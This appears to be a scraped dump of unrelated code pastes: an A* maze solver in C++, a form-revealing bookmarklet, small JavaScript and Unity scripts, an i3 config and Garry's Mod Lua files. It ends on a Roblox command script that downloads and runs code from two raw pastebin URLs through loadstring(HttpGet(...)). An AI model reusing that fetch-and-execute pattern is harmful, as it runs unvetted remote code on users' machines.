    vector<vector<pair<double, double>>> values(mazeWidth, vector<pair<double, double>>(mazeHeight, {INFINITY, INFINITY}));

    // Crear un arreglo para almacenar el camino encontrado
    vector<pair<int, int>> path;

    // Insertar el nodo inicial en la cola de prioridad
    pq.push({start_x, start_y, 0.0, 0.0, heuristic(start_x, start_y, goal_x, goal_y)});
    values[start_x][start_y] = {0.0, heuristic(start_x, start_y, goal_x, goal_y)};

    while (!pq.empty()) {
        // Obtener el nodo con el menor valor f de la cola de prioridad
        Node current = pq.top();
        pq.pop();

        int x = current.x;
        int y = current.y;

        // Verificar si se alcanzó el nodo objetivo
        if (x == goal_x && y == goal_y) {
            // Rastrear el camino desde el nodo objetivo hasta el nodo inicial
            int cx = goal_x, cy = goal_y;
            while (cx != start_x || cy != start_y) {
                path.push_back({cx, cy});
                double min_f = INFINITY;
                int nx, ny;
                for (int i = 0; i < 4; ++i) {
                    int nx = cx + dx[i];
                    int ny = cy + dy[i];
                    if (isValid(nx, ny, mazeWidth, mazeHeight) && values[nx][ny].first + values[nx][ny].second < min_f) {
                        min_f = values[nx][ny].first + values[nx][ny].second;
                        cx = nx;
                        cy = ny;
                    }
                }
            }
            path.push_back({start_x, start_y});
            reverse(path.begin(), path.end());  // Invertir el camino para que esté en el orden correcto
            return path;
        }

        // Explorar los nodos vecinos
        for (int i = 0; i < 4; ++i) {
            int nx = x + dx[i];
            int ny = y + dy[i];

            // Verificar si la posición vecina es válida
            if (isValid(nx, ny, mazeWidth, mazeHeight)) {
                double new_g = current.g + 1.0; // Distancia hasta el vecino (asumiendo un costo de movimiento de 1)

                // Verificar si se encontró una mejor ruta hacia el vecino
                if (new_g < values[nx][ny].first) {
                    values[nx][ny].first = new_g; // Actualizar el valor de g
                    values[nx][ny].second = heuristic(nx, ny, goal_x, goal_y); // Calcular el valor de h
                    pq.push({nx, ny, new_g + values[nx][ny].second, new_g, values[nx][ny].second}); // Insertar el nodo en la cola de prioridad
                }
            }
        }
    }
    // Si no se encontró ningún camino, devolver un vector vacío
    return {};
}

int main() {
    // Comenzamos el programa ------------------------------------------
    std::cout << std::endl;
    std::cout << ""Starting the program ..."" << std::endl;
    std::cout << std::endl;

    const int screen_Width = 800;       // Sin interface entero seria 300
    const int screen_Height = 800;      // Sin interface entero seria 600
    int FPS = 60;
    bool lab = false;                   // Estado de la busqueda en el laberinto
    bool gameOver = false;              // Saber si ya hemos acabado, para no volver a imprimir
    const int cellSize = 50;

    // Posicion de el comienzo del laberinto y la salida del laberinto
    int start_x, start_y, goal_x, goal_y;

    // Crear un arreglo para almacenar el camino encontrado
    vector<pair<int, int>> path;
    
    InitWindow(screen_Width, screen_Height, ""Resolucion de Laberintos con RayLib"");
    SetTargetFPS(FPS);
    SetConfigFlags(FLAG_VSYNC_HINT);

    // 1. Event Handing ---------------------------------------------
    BeginDrawing();
    ClearBackground(WHITE);

    // Encontrar las coordenadas de inicio del laberitno '2' y objetivo de salida '3'
    for (int y1 = 0; y1 < mazeHeight; ++y1) {
        for (int x1 = 0; x1 < mazeWidth; ++x1) {
            if (maze[y1][x1] == START) {
                start_x = x1;
                start_y = y1;
            } else if (maze[y1][x1] == GOAL) {
                goal_x = x1;
                goal_y = y1;
            }
        }
    }
    //cout << endl;
    //cout << ""Comienzo X: "" << start_x << endl;
    //cout << ""Comienzo Y: "" << start_y << endl;
    //cout << ""Salida X: "" << goal_x << endl;
    //cout << ""Salida Y: "" << goal_y << endl;

    // Punto de inicio del tiempo
    clock_t start = clock();

    // Llamar al algoritmo A* para encontrar la ruta más corta
    path = AStar(start_x, start_y, goal_x, goal_y, mazeWidth, mazeHeight);
    
    // Punto de finalización del tiempo
    clock_t end = clock();
    
    // Calcula la duración de la ejecución en milisegundos
    double duration = static_cast<double>(end - start) / CLOCKS_PER_SEC * 1000;

    // Imprime el tiempo transcurrido
    char durationText[30];
    snprintf(durationText, sizeof(durationText), ""La busqueda tardó: %.2f ms"", duration);
    DrawText(durationText, 400, 710, 20, RED);
    //cout << endl;
    //cout << ""La busqueda tardó: "" << duration << "" ms en ejecutarse."" << endl;

    // 2. Updating State --------------------------------------------

    // 3. Drawing Objects -------------------------------------------

    // Dibujar el laberinto
    for (int y1 = 0; y1 < mazeHeight; y1++) {
        for (int x1 = 0; x1 < mazeWidth; x1++) {
            if (maze[y1][x1] == 1) {
                DrawRectangle(x1 * cellSize, y1 * cellSize, cellSize, cellSize, darkGreen);
            }
        }
    }
    DrawRectangle(start_x * cellSize, start_y * cellSize, cellSize, cellSize, Yellow);
    DrawRectangle(goal_x * cellSize, goal_y * cellSize, cellSize, cellSize, Grey);
    if (!path.empty()) {
        //cout << endl;
        //cout << ""Se encontró una ruta hasta el objetivo !!"" << endl;
        //cout << endl;
        // Imprimir el camino encontrado
        //cout << ""Camino encontrado:"" << endl;
        for (int i = path.size() - 1; i >= 0; --i) {
            DrawRectangle(path[i].first * cellSize, path[i].second * cellSize, cellSize, cellSize, lightGreen); // Dibujar la solucion al laberinto
            // Impresion por consola del resultado del camino optimo
            //cout << ""("" << path[i].first << "", "" << path[i].second << "")"";
            //if (i > 0) cout << "" -> "";
        }
        //cout << endl;
    }
    
    // Mostrar mensaje de salida o repeticion.
    DrawText(""Pulsa una tecla para salir"", 400, 750, 20, RED);
    EndDrawing();
    bool keyPressed = false; // Variable para almacenar si se ha presionado una tecla
    while (!WindowShouldClose() && !keyPressed) {
        // Esperar a que el usuario pulse la tecla SPACE para continuar
        if (IsKeyPressed(KEY_SPACE)) {
            keyPressed = true; // Marcar que se ha presionado una tecla
        }
    }

    CloseWindow();
    return 0;
}
"
2AitUQAe,show_fields_bookmarklet,idarktech,JavaScript,Sunday 14th of April 2024 05:42:35 PM CDT,"javascript:(function() {
    const hiddenConditionFields = document.querySelectorAll('.form-field-hidden');
    const alwaysHidden = document.querySelectorAll('.always-hidden');
    const closedCollapse = document.querySelectorAll('.form-section-closed');
    const pageBreaks = document.querySelectorAll('.form-pagebreak-next');
    const otherWidgets = document.querySelectorAll('.form-line[data-type=""control_widget""]');
    const formSections = document.querySelectorAll('.form-all > .form-section');

  hiddenConditionFields.forEach(function(section) {
    section.style.display = 'block';
    section.classList.remove(""form-field-hidden"");
  });

  alwaysHidden.forEach(function(section) {
    section.classList.remove(""always-hidden"");
  });  

  closedCollapse.forEach(function(section) {
    section.style.height = 'auto';
    section.classList.remove(""form-section-closed"");
    section.classList.add(""form-section"");
  });

  formSections.forEach(function(section) {
    section.style.display = '';
  });
  if (otherWidgets.length > 0) {
        otherWidgets.forEach(function(el) {                   
          var qid = el.id.split('_')[1];
          if (JotForm.getInputType(qid) === 'widget') {
          JotForm.showWidget(qid);      
          }
        });
      }
var customCSS = `
  ul#cardAnimationWrapper {
    display: flex !important;
    flex-wrap: nowrap;
    flex-direction: column;
    width: auto !important;
    transform: unset !important;
    transform-origin: unset !important;
    align-items: center;
    position: initial !important;
    overflow: visible !important;
}
.jfCard-wrapper {
    opacity: 1;
    visibility: visible;
    float: unset !important;
    margin: 10px 0 !important;
}
.jfForm-wrapper {
    overflow: scroll !important;
}
.jfCard {
    transform: unset !important;
}
html, body {
    position: initial !important;
    overflow: visible !important;
    transform: unset !important;
}
ul#cardAnimationWrapper,
.jfForm-wrapper{
    height: auto !important;
}
.jfCard-index {
    display: none;
}
.welcomeMode .jfForm-all, .thankyouMode .jfForm-all, .reviewMode .jfForm-all, .sectionHeaderMode .jfForm-all {
    opacity: 1 !important;
    visibility: visible !important;
    pointer-events: unset !important;
}
.jfWelcome-wrapper,
.jfForm-background-mask{
display:none !important;
}
.form-all > ul.form-section {
    position: relative !important;
    counter-increment: step-counter;
}
.form-all > ul.form-section:before {
    color: red;
    content: counter(step-counter);
    font-size: 20px;
    width: 30px;
    height: 30px;
    line-height: 30px;
    text-align: center;
    position: absolute;
    right: 0 !important;
    top: 0 !important;
    background: #e8e8e8;
    border-radius: 50%;
    font-family: fantasy;
    z-index: 9;
    display: block;
}
div#pdfimporter-root{
  display:none;
}`;

  var style = document.createElement('style');
  style.type = 'text/css';
  style.appendChild(document.createTextNode(customCSS));
  document.head.appendChild(style);
})();"
J0UaG3ck,3.LoadMealsAdd,Silviya7,JavaScript,Sunday 14th of April 2024 05:06:11 PM CDT,"
const BtnLoadMeals= document.getElementById('load-meals');
const BtnAddMeal=document.getElementById('add-meal');
const ElementList= document.getElementById('list');

const Elementfood= document.getElementById('food');
const Elementtime= document.getElementById('time');
const Elementcalories= document.getElementById('calories');


    const LoadMeals = async()=> {
    //Fetch all meals
    const response = await fetch(baseURL);
    const data= await response.json();
   // console.log(Object.values(data));
    
    ElementList.innerHTML='';

    for (const meal of Object.values(data)) {        
        const mealBtndiv= document.createElement('div');
        mealBtndiv.id='meal-buttons';

        const BtnChange=document.createElement('button');
        BtnChange.classList.add('change-meal');
        BtnChange.textContent='Change';

        const BtnDelete=document.createElement('button');
        BtnDelete.classList.add('delete-meal');
        BtnDelete.textContent='Delete';

        mealBtndiv.appendChild(BtnChange);
        mealBtndiv.appendChild(BtnDelete);

        const Elementh1=document.createElement('h2');
        Elementh1.textContent= meal.food;
        const Elementhtime3=document.createElement('h3');
        Elementhtime3.textContent= meal.time;
        const Elementhcalories3=document.createElement('h3')
        Elementhcalories3.textContent= meal.calories;

        const divMeal= document.createElement('div');
        divMeal.classList.add('meal');
        divMeal.appendChild(Elementh1);
        divMeal.appendChild(Elementhtime3);
        divMeal.appendChild(Elementhcalories3);
        divMeal.appendChild(mealBtndiv);

        ElementList.appendChild(divMeal);

    }

    };

    BtnLoadMeals.addEventListener('click',LoadMeals);

BtnAddMeal.addEventListener('click',async()=>{

    const food= Elementfood.value;
    const time= Elementtime.value;
    const calories= Elementcalories.value;
  //create post request

  const response= await fetch(baseURL, {
     method :'POST',
     headers:{
     'content-type':'application/json',
     },
     body: JSON.stringify({food,time,calories }),
     });
  
  await LoadMeals();
   Elementfood.value="""";
   Elementtime.value="""";
   Elementcalories.value="""";
});"
tja4zvhW,Untitled,lemansky,C#,Sunday 14th of April 2024 04:32:59 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class MagicArrow : MonoBehaviour
{
    // Start is called before the first frame update
    public GameObject prefab;
    public GameObject prefabCast;
    public float shootCooldown = 0.2f;
    public float shootTimer = -1.0f;
    private GameObject target;
    private ParticleSystem Effect;

    void Update()
    {
        if (Input.GetKeyDown(KeyCode.Alpha1))
        {
            ShootMagic();
        }
    }
    
    void ShootMagic()
    {
        for(int i = 0; i < 5; i++)
        {
            GameObject projectile = Instantiate(prefabCast, transform.position, transform.rotation);
            target = GameObject.FindGameObjectWithTag(""Enemy"") ?? null;
            if (target != null)
            {
                projectile.GetComponent<TargetProjectile>().UpdateTarget(target.transform, Vector3.zero);
                Effect = prefab.GetComponent<ParticleSystem>();
                Effect.Play();
            }
        }
       
    }
}
"
kva8u5MY,ai,the_1826,C++,Sunday 14th of April 2024 04:10:28 PM CDT,"#include <bits/stdc++.h>

using namespace std;

int entry1[3][3];
float weights1[3][3], result1[3][3], formul, formul_temp, s = 0.0, target = 0.95, a, b;

inline float float_rand(float minvalue, float maxvalue)
{
    float scale = rand() / (float)RAND_MAX;
    return minvalue + scale * (maxvalue - minvalue);
}

inline float gamma(float x) {
    if (x <= a)
        return 0;
    else if (x > b)
        return 1;
    else return ((x - a)/(b - a));
}

inline void value_pick_any() {
    for (int i = 0; i < 3; i++)
        for (int j = 0; j < 3; j++)
            weights1[i][j] = float_rand(-1.0,1.0);
}

inline float hebb_change(float x) {
    const float limit = 0.1;
    return limit * x;
}

inline void value_pick_hebb() {
    hebb_restart:
    value_pick_any();
    a = 0.2;
    b = 3.5;
    cout << ""a = "" << a << endl;
    cout << ""b = "" << b << endl;
    cout << ""weight[0][0] = "" << weights1[0][0] << endl;
    cout << ""weight[0][1] = "" << weights1[0][1] << endl;
    cout << ""weight[0][2] = "" << weights1[0][2] << endl;
    cout << ""weight[1][0] = "" << weights1[1][0] << endl;
    cout << ""weight[1][1] = "" << weights1[1][1] << endl;
    cout << ""weight[1][2] = "" << weights1[1][2] << endl;
    cout << ""weight[2][0] = "" << weights1[2][0] << endl;
    cout << ""weight[2][1] = "" << weights1[2][1] << endl;
    cout << ""weight[2][2] = "" << weights1[2][2] << endl;
    cout << ""Starting to search for values..."" << endl;
    while (!(formul > target)) {
        s = 0.0;
        for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++) {
                    result1[i][j] = entry1[i][j] * weights1[i][j];
                    s += result1[i][j];
                }
        formul_temp = gamma(s);
        if ((formul_temp) == 0) {
            cout << ""Bad weights. Restarting."" << endl;
            _sleep(500);
            cout << ""-----"" << endl;
            goto hebb_restart;
        }
        cout << ""Was before Hebb rule: "" << formul_temp << endl;
        for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++) {
                        if (!(weights1[i][j] > 1))
                            weights1[i][j] += hebb_change(weights1[i][j]);
                }
        s = 0.0;
        for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++) {
                    result1[i][j] = entry1[i][j] * weights1[i][j];
                    s += result1[i][j];
                }
        formul = gamma(s);
        if (formul > formul_temp) {
            cout << ""Became with Hebb rule: "" << formul << endl;
            _sleep(500);
        }
        else {
            cout << ""Became with Hebb rule: "" << formul << endl;
            cout << ""Bad result. Restarting."" << endl;
            cout << ""-----"" << endl;
            goto hebb_restart;
        }
        }
    cout << ""Values found!"" << endl;
    cout << ""Final result: "" << formul << endl;
}

inline void value_pick_random()
{
    s = 0.0;
    a = float_rand(0.0, 2.0), b = float_rand(0.0, 7.0);
    cout << ""Starting to search for values..."" << endl;
    while (!(formul > target)) {
    value_pick_any();
        s = 0.0;
        for (int i = 0; i < 3; i++)
                for (int j = 0; j < 3; j++) {
                    result1[i][j] = entry1[i][j] * weights1[i][j];
                    s += result1[i][j];
                }
        formul = gamma(s);
    }
    cout << ""Values found!"" << endl;
    cout << ""a = "" << a << endl;
    cout << ""b = "" << b << endl;
    cout << ""weight[0][0] = "" << weights1[0][0] << endl;
    cout << ""weight[0][1] = "" << weights1[0][1] << endl;
    cout << ""weight[0][2] = "" << weights1[0][2] << endl;
    cout << ""weight[1][0] = "" << weights1[1][0] << endl;
    cout << ""weight[1][1] = "" << weights1[1][1] << endl;
    cout << ""weight[1][2] = "" << weights1[1][2] << endl;
    cout << ""weight[2][0] = "" << weights1[2][0] << endl;
    cout << ""weight[2][1] = "" << weights1[2][1] << endl;
    cout << ""weight[2][2] = "" << weights1[2][2] << endl;
    cout << ""formul = "" << formul << endl;
}

int main()
{
    system(""CLS"");
    system(""title AI"");
    system(""mode con cols=126 lines=59"");
    srand(time(NULL));
    restart:
    entry1[0][0] = 1;
    entry1[0][1] = 1;
    entry1[0][2] = 0;
    entry1[1][0] = 0;
    entry1[1][1] = 1;
    entry1[1][2] = 1;
    entry1[2][0] = 1;
    entry1[2][1] = 0;
    entry1[2][2] = 0;
    value_pick_hebb();
    entry1[0][0] = 0;
    entry1[0][1] = 1;
    entry1[0][2] = 0;
    entry1[1][0] = 0;
    entry1[1][1] = 1;
    entry1[1][2] = 1;
    entry1[2][0] = 1;
    entry1[2][1] = 0;
    entry1[2][2] = 1;
    s = 0.0;
    for (int i = 0; i < 3; i++)
            for (int j = 0; j < 3; j++) {
                result1[i][j] = entry1[i][j] * weights1[i][j];
                s += result1[i][j];
            }
    formul = gamma(s);
    if (formul > 0.5) {
        cout << ""Apr 1"" << ' ' << formul << endl;
    }
    else {
        cout << ""Apr 2"" << ' ' << formul << endl;
    }
}
"
H0L8QzfD,Empower Your Trading with the $15 Margin Call Bonus at NordFX,reviewbrokers,PHP,Sunday 14th of April 2024 03:22:25 PM CDT,https://www.reviewbrokers.net/empower-your-trading-with-the-15-margin-call-bonus-at-nordfx/
cs9SzCC4,i3 Config,Wrigs,Bash,Sunday 14th of April 2024 02:53:54 PM CDT,"################################################################################
#
#   __  __    __ 
#   \ \/ / /\ \ \
#    \ \ \/  \/ /
# /\_/ /\  /\  / 
# \___/  \/  \/  
#
# This file has been auto-generated by i3-config-wizard(1).
# It will not be overwritten, so edit it as you like.
#
# Should you change your keyboard layout some time, delete
# this file and re-run i3-config-wizard(1).
#
# Modified by Jeff Wrigley
# See http://i3wm.org/docs/userguide.html for a complete reference!
#
################################################################################

# This file has been auto-generated by i3-config-wizard(1).
# It will not be overwritten, so edit it as you like.
#
# Should you change your keyboard layout some time, delete
# this file and re-run i3-config-wizard(1).
#

# i3 config file (v4)
#
# Please see https://i3wm.org/docs/userguide.html for a complete reference!

set $mod Mod4

# Font for window titles. Will also be used by the bar unless a different font
# is used in the bar {} block below.
font pango:System San Francisco Display 10

# This font is widely installed, provides lots of unicode glyphs, right-to-left
# text rendering and scalability on retina/hidpi displays (thanks to pango).
#font pango:DejaVu Sans Mono 10

# Start XDG autostart .desktop files using dex. See also
# https://wiki.archlinux.org/index.php/XDG_Autostart
exec --no-startup-id dex --autostart --environment i3

# The combination of xss-lock, nm-applet and pactl is a popular choice, so
# they are included here as an example. Modify as you see fit.

# xss-lock grabs a logind suspend inhibit lock and will use i3lock to lock the
# screen before suspend. Use loginctl lock-session to lock your screen.
exec --no-startup-id xss-lock --transfer-sleep-lock -- i3lock --nofork

# NetworkManager is the most popular way to manage wireless networks on Linux,
# and nm-applet is a desktop environment-independent system tray GUI for it.
exec --no-startup-id nm-applet

# Use Mouse+$mod to drag floating windows to their wanted position
floating_modifier $mod

# start a terminal
bindsym $mod+Return exec i3-sensible-terminal

# kill focused window
bindsym $mod+Shift+q kill

# start dmenu (a program launcher)
# bindsym $mod+d exec --no-startup-id dmenu_run
# A more modern dmenu replacement is rofi:
# bindcode $mod+40 exec ""rofi -modi drun,run -show drun""
# There also is i3-dmenu-desktop which only displays applications shipping a
# .desktop file. It is a wrapper around dmenu, so you need that installed.
# bindcode $mod+40 exec --no-startup-id i3-dmenu-desktop

# start rofi (a program launcher)
bindsym $mod+d exec --no-startup-id rofi -show drun -show-icons -display-drun prompt

# change focus
bindsym $mod+j focus left
bindsym $mod+k focus down
bindsym $mod+l focus up
bindsym $mod+semicolon focus right

# alternatively, you can use the cursor keys:
bindsym $mod+Left focus left
bindsym $mod+Down focus down
bindsym $mod+Up focus up
bindsym $mod+Right focus right

# move focused window
bindsym $mod+Shift+j move left
bindsym $mod+Shift+k move down
bindsym $mod+Shift+l move up
bindsym $mod+Shift+semicolon move right

# alternatively, you can use the cursor keys:
bindsym $mod+Shift+Left move left
bindsym $mod+Shift+Down move down
bindsym $mod+Shift+Up move up
bindsym $mod+Shift+Right move right

# split in horizontal orientation
bindsym $mod+h split h

# split in vertical orientation
bindsym $mod+v split v

# enter fullscreen mode for the focused container
bindsym $mod+f fullscreen toggle

# change container layout (stacked, tabbed, toggle split)
bindsym $mod+s layout stacking
bindsym $mod+w layout tabbed
bindsym $mod+e layout toggle split

# toggle tiling / floating
bindsym $mod+Shift+space floating toggle

# change focus between tiling / floating windows
bindsym $mod+space focus mode_toggle

# focus the parent container
bindsym $mod+a focus parent

# focus the child container
#bindsym $mod+d focus child


################################################################################
##  Workspaces
################################################################################

# Define names for default workspaces for which we configure key bindings later on.
# We use variables to avoid repeating the names in multiple places.
set $ws1 ""1""
set $ws2 ""2""
set $ws3 ""3""
set $ws4 ""4""
set $ws5 ""5""
set $ws6 ""6""
set $ws7 ""7""
set $ws8 ""8""
set $ws9 ""9""
set $ws10 ""10""

# switch to workspace
bindsym $mod+1 workspace number $ws1
bindsym $mod+2 workspace number $ws2
bindsym $mod+3 workspace number $ws3
bindsym $mod+4 workspace number $ws4
bindsym $mod+5 workspace number $ws5
bindsym $mod+6 workspace number $ws6
bindsym $mod+7 workspace number $ws7
bindsym $mod+8 workspace number $ws8
bindsym $mod+9 workspace number $ws9
bindsym $mod+0 workspace number $ws10

# move focused container to workspace
bindsym $mod+Shift+1 move container to workspace number $ws1
bindsym $mod+Shift+2 move container to workspace number $ws2
bindsym $mod+Shift+3 move container to workspace number $ws3
bindsym $mod+Shift+4 move container to workspace number $ws4
bindsym $mod+Shift+5 move container to workspace number $ws5
bindsym $mod+Shift+6 move container to workspace number $ws6
bindsym $mod+Shift+7 move container to workspace number $ws7
bindsym $mod+Shift+8 move container to workspace number $ws8
bindsym $mod+Shift+9 move container to workspace number $ws9
bindsym $mod+Shift+0 move container to workspace number $ws10

# reload the configuration file
bindsym $mod+Shift+c reload
# restart i3 inplace (preserves your layout/session, can be used to upgrade i3)
bindsym $mod+Shift+r restart
# exit i3 (logs you out of your X session)
bindsym $mod+Shift+e exec ""i3-nagbar -t warning -m 'You pressed the exit shortcut. Do you really want to exit i3? This will end your X session.' -B 'Yes, exit i3' 'i3-msg exit'""

# resize window (you can also use the mouse for that)
mode ""resize"" {
        # These bindings trigger as soon as you enter the resize mode

        # Pressing left will shrink the window’s width.
        # Pressing right will grow the window’s width.
        # Pressing up will shrink the window’s height.
        # Pressing down will grow the window’s height.
        bindsym j resize shrink width 10 px or 10 ppt
        bindsym k resize grow height 10 px or 10 ppt
        bindsym l resize shrink height 10 px or 10 ppt
        bindsym semicolon resize grow width 10 px or 10 ppt

        # same bindings, but for the arrow keys
        bindsym Left resize shrink width 10 px or 10 ppt
        bindsym Down resize grow height 10 px or 10 ppt
        bindsym Up resize shrink height 10 px or 10 ppt
        bindsym Right resize grow width 10 px or 10 ppt

        # back to normal: Enter or Escape or $mod+r
        bindsym Return mode ""default""
        bindsym Escape mode ""default""
        bindsym $mod+r mode ""default""
}

bindsym $mod+r mode ""resize""

# Start i3bar to display a workspace bar (plus the system information i3status
# finds out, if available)
bar {
        status_command i3status
        position top
        font -misc-fixed-medium-r-normal--13-120-75-75-C-70-iso10646-1
        font pango:System San Francisco Display 11
}

################################################################################
##  Floating or Tiled
################################################################################

#floating enabled from some programs - find with xprop

# for_window [class=""Arcolinux-welcome-app.py""] floating enable
# for_window [class=""Arcolinux-tweak-tool.py""] floating enable
# for_window [class=""Arcolinux-calamares-tool.py""] floating enable
for_window [class=""Bleachbit""] floating disable
for_window [class=""Blueberry.py""] floating enable
for_window [class=""Brasero""] floating disable
for_window [class=""Galculator""] floating enable
for_window [class=""Gnome-disks""] floating disable
for_window [class=""^Gnome-font-viewer$""] floating enable
for_window [class=""^Gpick$""] floating enable
for_window [class=""Hexchat""] floating disable
for_window [class=""Imagewriter""] floating enable
for_window [class=""Font-manager""] floating enable
# for_window [class=""qt5ct|Lxappearance] floating enable
for_window [class=""Nitrogen""] floating disable
for_window [class=""Pavucontrol""] floating disable
for_window [class=""Peek""] floating enable
# for_window [class=""^Skype$""] floating enable
for_window [class=""^Spotify$""] floating disable
for_window [class=""System-config-printer.py""] floating enable
for_window [class=""Unetbootin.elf""] floating enable
for_window [class=""Usb-creator-gtk""] floating enable
for_window [class=""^Vlc$""] floating disable
for_window [class=""Wine""] floating disable
for_window [class=""Xfburn""] floating disable
for_window [class=""Xfce4-appfinder""] floating enable
for_window [class=""Xfce4-settings-manager""] floating disable
for_window [class=""Xfce4-taskmanager""] floating enable
for_window [class=""KeePassXC""] floating enable


#for_window [instance=""gimp""] floating disable
#for_window [instance=""script-fu""] border normal
# for_window [instance=""variety""] floating disable


for_window [title=""Copying""] floating enable
for_window [title=""Deleting""] floating enable
for_window [title=""Moving""] floating enable
for_window [title=""^Terminator Preferences$""] floating enable


#for_window [window_role=""^gimp-toolbox-color-dialog$""] floating enable
for_window [window_role=""pop-up""] floating enable
for_window [window_role=""^Preferences$""] floating enable
for_window [window_role=""setup""] floating enable



################################################################################
##  Give Focus to Applications
################################################################################

for_window [class=""Alactritty""] focus
for_window [class=""Gnome-terminal""] focus
for_window [class=""Termite""] focus
for_window [class=""Terminator""] focus
for_window [class=""Tilix""] focus
for_window [class=""Urxvt""] focus


################################################################################
## PulseAudio controls
################################################################################

bindsym $mod+F10 exec pactl set-sink-mute @DEFAULT_SINK@ toggle # Mute
bindsym $mod+F11 exec pactl set-sink-volume @DEFAULT_SINK@ -5%  # Up
bindsym $mod+F12 exec pactl set-sink-volume @DEFAULT_SINK@ +5%  # Down

# Use pactl to adjust volume in PulseAudio.
set $refresh_i3status killall -SIGUSR1 i3status
bindsym XF86AudioRaiseVolume exec --no-startup-id pactl set-sink-volume @DEFAULT_SINK@ +10% && $refresh_i3status
bindsym XF86AudioLowerVolume exec --no-startup-id pactl set-sink-volume @DEFAULT_SINK@ -10% && $refresh_i3status
bindsym XF86AudioMute exec --no-startup-id pactl set-sink-mute @DEFAULT_SINK@ toggle && $refresh_i3status
bindsym XF86AudioMicMute exec --no-startup-id pactl set-source-mute @DEFAULT_SOURCE@ toggle && $refresh_i3status


################################################################################
##  Settings for I3 gaps
################################################################################

# https://i3wm.org/docs/userguide.html#gaps
# delete or uncomment the following lines if you do not have it or do not
# want it


for_window [class=""^.*""] border pixel 2

# Inner gaps for all windows: space between two adjacent windows (or split containers).
gaps inner 6

# Outer gaps for all windows: space along the screen edges.
gaps outer 6

# Inner and outer gaps for all windows on a specific workspace.
# <ws> can be a workspace number or name.
# workspace <ws> gaps inner <gap_size>[px]
# workspace <ws> gaps outer|horizontal|vertical|top|left|bottom|right <gap_size>[px]

# Enabling “Smart Gaps” means no gaps will be shown when there is
# precisely one window or split container on the workspace.
#
# inverse_outer only enables outer gaps when there is exactly one
# window or split container on the workspace.
# smart_gaps on|off|inverse_outer


################################################################################
##  AutoStart Apps
################################################################################
exec_always --no-startup-id nitrogen --restore


# TRAY APPLICATIONS

# applications that are not installed will not start
# you may see a wheel - hashtag out things you do not want

# Authentication dialog
# exec --no-startup-id /usr/lib/polkit-gnome/polkit-gnome-authentication-agent-1 &

# Updater
# exec --no-startup-id pamac-tray

# bluetooth
# exec --no-startup-id blueberry-tray

# network
exec --no-startup-id nm-applet

# num lock activated
exec_always --no-startup-id numlockx on

# dropbox
#exec --no-startup-id dropbox start

# insync
# exec --no-startup-id insync start

# Volume
#exec --no-startup-id pasystray
exec --no-startup-id volumeicon

# Variety
# exec --no-startup-id variety

# clipman
# exec --no-startup-id xfce4-clipman

# Conky
exec --no-startup-id conky -c ~/.config/i3/system-overview

# feh sets wallpaper
# exec --no-startup-id feh --bg-fill /usr/share/backgrounds/arcolinux/arco-wallpaper.jpg &
exec --no-startup=id feh --bg-scale ~/Pictures/Wallpapers/wp2445832-autism-wallpapers.jpg

# Polybar
#exec_always --no-startup-id ~/.config/polybar/launch.sh &

# PulseAudio
exec --no-startup-id pulseaudio
exec --no-startup-id pa-applet
"
Wqb53x7B,sh_language.lua,Lukyspore,Lua,Sunday 14th of April 2024 02:52:46 PM CDT,"LDT_Decals.Language = LDT_Decals.Language or {}

LDT_Decals.Language = {
    en = {
        DecalsTitle = ""Decals"",
        DecalToolName = ""Decals Decal Setup"",
        ToolDesc = ""Setup a Decal"",
        ToolLeft = ""Left click to an empty space to create a Decal or to a Decal to edit it"",
        ToolRight = ""Right click to remove a Decal"",
        ToolFPPPerms = ""FPP Blocks your ability to use this tool"",
        ToolFPPCheck = ""Check you can toolgun this entity with FPP"",
        DecalsText = ""Decals"",
        ConfigurationText = ""Configuration"",
        DecalConfigTitle = ""Decal Configuration"",
        SaveConfig = ""Save Config"",
        URL = ""Image URL"",
        ScaleY = ""Scale Y"",
        ScaleX = ""Scale X"",
        Color = ""Color"",
    }
}"
0c4xryKs,sh_config.lua,Lukyspore,Lua,Sunday 14th of April 2024 02:52:15 PM CDT,"LDT_Decals = LDT_Decals or {}
LDT_Decals.Config = LDT_Decals.Config or {}

LDT_Decals.Config.Language = ""en"" -- Currently there are en, de, es and fr translations available.

LDT_Decals.Config.AdminRanks = {
    [""superadmin""] = true,
    [""admin""] = true
} -- These are the ranks that can spawn new displays, stands and scoreboards. You can add more ranks if you want to.

LDT_Decals.Config.DefaultImage = ""https://i.imgur.com/PhGIPKf.jpg"" -- This is the default image that will be used if the user doesn't provide one.

-- These are the colors for every element of the UI. Feel free to change them to your liking.
LDT_Decals.Config.Red = Color(255, 63, 5)
LDT_Decals.Config.White = Color(255,255,255)
LDT_Decals.Config.Grey = Color(47, 54, 64)
LDT_Decals.Config.GreySecond = Color(53, 59, 72)
LDT_Decals.Config.Blue = Color(0, 151, 230)

-- These are the materials for every element of the UI. Feel free to change them to your liking.
LDT_Decals.Materials = LDT_Decals.Materials or {}
LDT_Decals.Materials.ToolBG = Material(""ldt_decals/display_bg_small.png"", ""ignorez"")
LDT_Decals.Materials.XIcon = Material(""ldt_decals/x.png"", ""noclamp smooth"")"
mQmcyqJ3,Mad,Unknown_No_1,PHP,Sunday 14th of April 2024 02:22:57 PM CDT,NewModComingSoonOnMadGamerTG
kVTrwfN5,CMDS,IIRyoII,Lua,Sunday 14th of April 2024 02:02:27 PM CDT,"repeat wait() until game:IsLoaded()

game:GetService(""StarterGui""):SetCore(""SendNotification"",{
    Title = ""[SERVER]"",  
    Text = ""Privated Cmds"",
    Icon = ""rbxassetid://16590941074"",
    Duration = 2
})
wait(1)
game:GetService(""StarterGui""):SetCore(""SendNotification"",{  
    Title = ""[SERVER]"",     
    Text = ""Made by Oppenheimer"",
    Icon = ""rbxassetid://16590941074""
})
wait(1)
game:GetService(""StarterGui""):SetCore(""SendNotification"",{  
    Title = ""[SERVER]"",     
    Text = ""Type cmds for get started!"",
    Icon = ""rbxassetid://16590941074""
})

spawn(function() 
    loadstring(game:HttpGet(('https://pastebin.com/raw/EgTd71aJ'),true))()
end)
spawn(function() 
    loadstring(game:HttpGet(('https://pastebin.com/raw/ucCMDZcj'),true))()
end)

local TweenService = game:GetService(""TweenService"")
local Players = game:GetService(""Players"")
local LocalPlayer = Players.LocalPlayer
local currentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
local index = 1
local Pos = {
    CFrame.new(-338, 33, -6273),
